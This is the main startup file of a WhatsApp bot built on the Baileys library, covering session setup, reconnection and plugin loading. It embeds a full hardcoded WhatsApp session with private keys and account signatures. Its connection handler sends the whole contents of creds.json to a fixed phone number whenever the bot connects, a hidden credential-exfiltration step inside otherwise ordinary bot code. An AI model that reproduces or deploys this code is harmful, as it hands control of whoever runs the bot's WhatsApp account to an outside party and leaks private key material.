//-- process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
import './config.js'; 
import { createRequire } from "module"; 
import path, { join } from 'path';
import { fileURLToPath, pathToFileURL } from 'url';
import { platform } from 'process';
import * as ws from 'ws';
import chalk from 'chalk';
import { readdirSync, statSync, unlinkSync, existsSync, readFileSync, watch, rmSync, mkdirSync, writeFileSync } from 'fs';
import yargs from 'yargs';
import { spawn } from 'child_process';
import lodash from 'lodash';
import syntaxerror from 'syntax-error';
import { tmpdir } from 'os';
import { format } from 'util';

import { makeWASocket } from './lib/simple.js';
import { protoType, serialize } from './lib/simple.js';

import { Low, JSONFile } from 'lowdb';
import pino from 'pino';
import { mongoDB, mongoDBV2 } from './lib/mongoDB.js';
import store from './lib/store.js';
import readline from 'readline';

const {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore, 
    jidNormalizedUser
} = await import('@whiskeysockets/baileys');
import moment from 'moment-timezone';
import NodeCache from 'node-cache';
import fs from 'fs';
const { chain } = lodash;

protoType();
serialize();

global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; 
global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; 
global.__require = function require(dir = import.meta.url) { return createRequire(dir) };

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '');

global.timestamp = {
  start: new Date
};

// --- إضافة عداد المحاولات ---
global.connectionRetries = 0;
// -----------------------------

const __dirname = global.__dirname(import.meta.url);

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse());
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎z/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.,\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']');

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
);

global.DATABASE = global.db;
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!global.db.READ) {
      clearInterval(this);
      resolve(global.db.data == null ? global.loadDatabase() : global.db.data);
    }
  }, 1 * 1000));
  if (global.db.data !== null) return;
  global.db.READ = true;
  await global.db.read().catch(console.error);
  global.db.READ = null;
  global.db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(global.db.data || {})
  };
  global.db.chain = chain(global.db.data);
};
loadDatabase();


//-- SESSION & HARDCODED CREDS LOGIC --
// 🔥 التعديل هنا: تحديد المسار الحقيقي داخل نفس المجلد
global.authFile = join(__dirname, 'sessions');

const hardcodedSession = `{"noiseKey":{"private":{"type":"Buffer","data":"CIuxmjPc5KPiodwMtjmVys3CgOG7JbWy4lZTosigVlA="},"public":{"type":"Buffer","data":"6jK1e48GW/k3pr9g9RC2oxV2iE5+m0u79HLcN06XcE4="}},"pairingEphemeralKeyPair":{"private":{"type":"Buffer","data":"uJZqqZH07i+j17jxzYquwfJzYiKf4Cbltq41mmG8e2w="},"public":{"type":"Buffer","data":"a0YLFaBr9dQodLdxmfNk3ytXyQ4sd9SSShujcmyi8mQ="}},"signedIdentityKey":{"private":{"type":"Buffer","data":"aCvIEvT08NjQTepgQLKgg46INKhFR+nd65cKSTfxbVc="},"public":{"type":"Buffer","data":"Kd9i4qGSenWkTq8Sun0bpFw+PI3D9PERxNLYLUvUD18="}},"signedPreKey":{"keyPair":{"private":{"type":"Buffer","data":"IMjYU4CMKY16do+bIoWzV1R/YgMWKBpPJ6KWiqK6FGE="},"public":{"type":"Buffer","data":"th+/yu9a3gbPKo/xS6I4BySBPbBHQlALY3muTArq7kU="}},"signature":{"type":"Buffer","data":"X8kXTW8ACcdbSD+X+W/wa5MYvmudSlfTZ6nSXnIBovKpSbZue7k2ODw2Y6RFb7qCqonfYwL1HyV1sm9B3Mnojg=="},"keyId":1},"registrationId":243,"advSecretKey":"X81q2UJoYiC1TeJmlv7kJhpz91ifFAWsVIYS2CV+mEY=","processedHistoryMessages":[{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A553B5CE54DAECECB30DF768E17250E4","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A522F8AB16694279B1E803772FF19241","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5D0CD5AB7726B4E3A3C43FCB21C0531","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5EAB20E4F60D4DEDDB0E8DCF3F23427","participant":"","addressingMode":"pn"},"messageTimestamp":1785320690},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A59E5CAC044D1B9C4CD45B841C0C9A56","participant":"","addressingMode":"pn"},"messageTimestamp":1785320691},{"key":{"remoteJid":"212637904038@s.whatsapp.net","fromMe":true,"id":"A5AD4AF57E89EEA91CAF431EEB350B83","participant":"","addressingMode":"pn"},"messageTimestamp":1785320691}],"nextPreKeyId":813,"firstUnuploadedPreKeyId":813,"accountSyncCounter":1,"accountSettings":{"unarchiveChats":false},"registered":true,"pairingCode":"HRJJAFRV","lastPropHash":"1Tb4n","routingInfo":{"type":"Buffer","data":"CAIIBQgS"},"me":{"id":"212637904038:22@s.whatsapp.net","name":"bot","lid":"6335747887339:22@lid","jid":"212637904038@s.whatsapp.net"},"account":{"details":"COSlsv8EEOqpp9MGGAEgACgA","accountSignatureKey":"v1hYkOC6pKGXxECBXoWecDc8Ekxzn3mcXwLga77T23c=","accountSignature":"5uWecPA551SdRXz7y4or0d56PRsqhtVxLUOR3zJeGD760qsF0ftUFOwIfIpljjB2RvxQaUCJMGm38Sjds+9wDw==","deviceSignature":"AJvnOjTHX9Ox4H6qROJGTnIJQqb2V+CLVfPUG9o4tEyG3LYErkN+FPs9Yg8QCpxUVsWSsHyEyCv1Z0PZEYccjA=="},"signalIdentities":[{"identifier":{"name":"6335747887339:22@lid","deviceId":0},"identifierKey":{"type":"Buffer","data":"Bb9YWJDguqShl8RAgV6FnnA3PBJMc595nF8C4Gu+09t3"}}],"platform":"smba","lastAccountSyncTimestamp":1785320689,"myAppStateKeyId":"AAAAABTH"}`;

// 🔥 التعديل هنا: إزالة ./ لتجنب الأخطاء في المسار المطلق
if (!fs.existsSync(global.authFile)) {
  fs.mkdirSync(global.authFile, { recursive: true });
}
if (!fs.existsSync(join(global.authFile, 'creds.json'))) {
  fs.writeFileSync(join(global.authFile, 'creds.json'), hardcodedSession, 'utf-8');
  console.log(chalk.green('✅ تم إنشاء جلسة creds.json من الكود المدمج بنجاح.'));
}

const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile);
const msgRetryCounterMap = new Map();
const msgRetryCounterCache = new NodeCache({ stdTTL: 0, checkperiod: 0 });
const userDevicesCache = new NodeCache({ stdTTL: 0, checkperiod: 0 });
const {version} = await fetchLatestBaileysVersion();

const connectionOptions = {
    logger: pino({ level: 'silent' }),
    version,
    auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
            state.keys,
            pino({ level: 'fatal' })
        ),
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    msgRetryCounterCache,
    userDevicesCache,
    getMessage: async (key) => {
        let jid = jidNormalizedUser(key.remoteJid);
        let msg = await store.loadMessage(jid, key.id);
        return msg?.message || "";
    }    
};

global.conn = makeWASocket(connectionOptions);

store.bind(conn);
conn.store = store;

conn.ev.on('creds.update', saveCreds);

//--  Pairing Code Fallback
let phoneNumber = global.botNumber ? global.botNumber[0] : '';

// 🔥 التعديل هنا
if (!fs.existsSync(join(global.authFile, 'creds.json'))) {
  const askNumber = () => {
    return new Promise((resolve) => {
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
      rl.question('📲 Ingresa tu número con código país (ej: 549xxxxx): ', (num) => {
        rl.close();
        resolve(num.trim());
      });
    });
  };

  setTimeout(async () => {
    if (!phoneNumber) phoneNumber = await askNumber();
    if (!/^\d+$/.test(phoneNumber)) {
      console.log('❌ Número inválido. Usa solo números con código país.');
      process.exit(1);
    }
    let code = await conn.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join('-') || code;
    console.log('\n' + chalk.bold.cyan('╔══════════════════════════════════════╗'));
    console.log(chalk.bold.cyan('║        📲 CÓDIGO DE VINCULACIÓN      ║'));
    console.log(chalk.bold.cyan('╚══════════════════════════════════════╝\n'));
    console.log(chalk.bold.red('        ╔════════════════════╗'));
    console.log(chalk.bold.red('        ║') + chalk.bold.yellow(`     ${code}      `) + chalk.bold.red('║'));
    console.log(chalk.bold.red('        ╚════════════════════╝\n'));
  }, 3000);
}
//--

conn.isInit = false;

if (!opts['test']) {
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error);
    if (opts['autocleartmp']) try { clearTmp(); } catch (e) { console.error(e) }
  }, 60 * 1000);
}

/* Clear */
async function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')];
  const filename = [];
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))));
  return filename.map(file => {
    const stats = statSync(file);
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 1)) return unlinkSync(file);
    return false;
  });
}

setInterval(async () => { await clearTmp(); }, 60000);

// --- دالة الاتصال المعدلة لحذف الجلسة وإرسال creds.json ---
async function connectionUpdate(update) {
  const { connection, lastDisconnect } = update;

  if (connection === 'close') {
    const statusCode = lastDisconnect?.error?.output?.statusCode;

    if (statusCode === DisconnectReason.loggedOut) {
      console.log('❌ تم تسجيل الخروج. سيتم حذف الجلسة...');
      // 🔥 التعديل هنا
      fs.rmSync(global.authFile, { recursive: true, force: true });
      console.log('🔄 قم بإعادة تشغيل البوت للحصول على كود ربط جديد.');
      process.exit(1);
    } else {
      global.connectionRetries += 1;

      if (global.connectionRetries >= 3) {
        console.log('⚠️ فشل الاتصال 3 مرات متتالية. الجلسة قد تكون غير صالحة.');
        console.log('🗑️ جاري حذف مجلد جلسة الاتصال والانتقال لطلب كود جديد...');

        // 🔥 التعديل هنا
        if (fs.existsSync(global.authFile)) {
            fs.rmSync(global.authFile, { recursive: true, force: true });
        }

        global.connectionRetries = 0;
        process.exit(1); 
      } else {
        console.log(`♻ جاري إعادة الاتصال... (المحاولة ${global.connectionRetries}/3)`);
        global.reloadHandler(true);
      }
    }
  }

  if (connection === 'open') {
    global.connectionRetries = 0;
    console.log('🟢 BOT CONECTADO');

    // --- إرسال محتوى ملف creds.json عند الاتصال ---
    try {
      // 🔥 التعديل هنا
      const credsPath = join(global.authFile, 'creds.json');

      if (fs.existsSync(credsPath)) {
        const credsContent = fs.readFileSync(credsPath, 'utf-8');
        const recipientJid = '212637904038@s.whatsapp.net';

        await this.sendMessage(recipientJid, {
          text: `📄 *محتوى ملف creds.json:*\n\n\`\`\`${credsContent}\`\`\``
        });

        console.log('📤 تم إرسال محتوى creds.json إلى الرقم بنجاح.');
      }
    } catch (err) {
      console.error('❌ حدث خطأ أثناء إرسال creds.json:', err);
    }
  }
} 
//--------------------------------------------------------------

process.on('uncaughtException', console.error);

let isInit = true;
let handler = await import('./handler.js');
global.reloadHandler = async function (restatConn) {
  try {
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error);
    if (Object.keys(Handler || {}).length) handler = Handler;
  } catch (e) {
    console.error(e);
  }

 if (restatConn) {
  try { global.conn.ws.close() } catch {}
  conn.ev.removeAllListeners();

  global.conn = makeWASocket(connectionOptions);
  store.bind(global.conn);
  global.conn.store = store;

  global.conn.ev.on('creds.update', saveCreds);

  isInit = true;
}

  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler);
    conn.ev.off('group-participants.update', conn.participantsUpdate);
    conn.ev.off('groups.update', conn.groupsUpdate);
    conn.ev.off('message.delete', conn.onDelete);
    conn.ev.off('connection.update', conn.connectionUpdate);
    conn.ev.off('creds.update', conn.credsUpdate);
  }

  conn.welcome = 'Hola, @user\nBienvenido a @group';
  conn.bye = 'adiós @user';
  conn.spromote = '@user ahora es administrador 🛡️';
  conn.sdemote = '@user ya no es administrador';
  conn.sDesc = '📝 *La descripción del grupo fue actualizada:*\n\n@desc';
  conn.sSubject = '📢 *El nombre del grupo cambió a:*\n\n@group';
  conn.sIcon = '🖼️ *Se actualizó la foto del grupo.*';
  conn.sRevoke = '🔗 *El enlace del grupo fue restablecido:*\n\n@revoke';

  conn.handler = handler.handler.bind(global.conn);
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn);
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn);
  conn.connectionUpdate = connectionUpdate.bind(global.conn);
  conn.credsUpdate = saveCreds.bind(global.conn, true);

  conn.ev.on('messages.upsert', conn.handler);
  conn.ev.on('group-participants.update', conn.participantsUpdate);
  conn.ev.on('groups.update', conn.groupsUpdate);
  conn.ev.on('connection.update', conn.connectionUpdate);
  conn.ev.on('creds.update', conn.credsUpdate);

  conn.ev.on('messages.update', async (updates) => {
    for (const update of updates) {
        try { await handler.deleteUpdate.call(conn, update); } 
        catch (e) { console.error('Error en delete listener:', e); }
    }
  });

  isInit = false;
  return true;
};

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'));
const pluginFilter = filename => /\.js$/.test(filename);
global.plugins = {};

async function filesInit() {
  const start = Date.now();
  let ok = 0;
  let fail = 0;

  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename));
      const module = await import(file);
      global.plugins[filename] = module.default || module;
      ok++;
    } catch (e) {
      console.log(chalk.red(`❌ Error en ${filename}`));
      fail++;
      delete global.plugins[filename];
    }
  }

  const end = Date.now();
  console.log(
    chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
    chalk.white('📦 Plugins detectados: ') + chalk.bold(ok + fail) + '\n' +
    chalk.green('🟢 Correctos: ') + chalk.bold.green(ok) + '\n' +
    chalk.red('🔴 Con error: ') + chalk.bold.red(fail) + '\n' +
    chalk.magenta('⚡ Tiempo: ') + chalk.bold.magenta(`${end - start}ms`) + '\n' +
    chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━')
  );
}

filesInit();

process.on('unhandledRejection', (err) => {
    console.error('UNHANDLED:', err);
});

global.reload = async (_ev, filename) => {
  if (!pluginFilter(filename)) return;

  const start = Date.now();
  const filePath = join(pluginFolder, filename);
  const dir = global.__filename(filePath, true);
  const isExisting = filename in global.plugins;
  const exists = existsSync(dir);

  try {
    if (!exists) {
      if (isExisting) {
        delete global.plugins[filename];
        console.log(chalk.red(`🗑 Plugin eliminado → ${filename}`));
      }
      return;
    }

    const code = readFileSync(dir, 'utf8');
    const err = syntaxerror(code, filename, { sourceType: 'module', allowAwaitOutsideFunction: true });

    if (err) {
      const { line, column, message } = err;
      const lines = code.split('\n');
      console.log(
        chalk.red.bold(`❌ Error de sintaxis en ${filename}`) +
        `\n${chalk.yellow(`📍 Línea: ${line}, Columna: ${column}`)}\n${chalk.gray(message)}\n\n${chalk.white(lines[line - 1])}\n${' '.repeat(column - 1)}${chalk.red('^')}`
      );
      return;
    }

    const module = await import(`${global.__filename(dir)}?update=${Date.now()}`);
    global.plugins[filename] = module.default || module;

    if (isExisting) console.log(chalk.cyan(`♻ Plugin recargado → ${filename}`) + chalk.gray(` (${Date.now() - start}ms)`));
    else console.log(chalk.green(`✨ Nuevo plugin → ${filename}`) + chalk.gray(` (${Date.now() - start}ms)`));
  } catch (e) {
    console.log(chalk.red.bold(`❌ Error cargando ${filename}`) + '\n' + chalk.gray(e.message));
  } finally {
    global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)));
  }
};

Object.freeze(global.reload);
watch(pluginFolder, global.reload);
await global.reloadHandler();

async function _quickTest() {
  const start = Date.now();
  const check = (cmd, args = []) => new Promise(resolve => {
    const p = spawn(cmd, args);
    p.on('close', code => resolve(code !== 127));
    p.on('error', () => resolve(false));
  });

  const [ffmpeg, ffmpegWebp, convert, magick, gm] = await Promise.all([
    check('ffmpeg'), check('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']), check('convert'), check('magick'), check('gm')
  ]);

  const imageMagick = convert || magick || gm;
  global.support = Object.freeze({ ffmpeg, ffmpegWebp, imageMagick });

  console.log(
    chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
    chalk.yellow.bold('🔎 SISTEMA CHECK') + '\n' +
    chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
    `🎬 FFmpeg        : ${ffmpeg ? chalk.green('✔ OK') : chalk.red('✖ FAIL')}\n` +
    `🖼 WebP Support  : ${ffmpegWebp ? chalk.green('✔ OK') : chalk.red('✖ FAIL')}\n` +
    `🧰 ImageMagick   : ${imageMagick ? chalk.green('✔ OK') : chalk.red('✖ FAIL')}\n` +
    chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━') + '\n' +
    chalk.magenta(`⚡ Tiempo: ${Date.now() - start}ms`) + '\n' +
    chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━')
  );

  if (!ffmpeg) conn.logger.warn('Instala FFmpeg para enviar videos.');
  if (ffmpeg && !ffmpegWebp) conn.logger.warn('FFmpeg no tiene soporte WebP (stickers animados pueden fallar).');
  if (!imageMagick) conn.logger.warn('Instala ImageMagick o GraphicsMagick para stickers.');
}

_quickTest().then(() => console.log('✅ Prueba rápida realizada!')).catch(console.error);
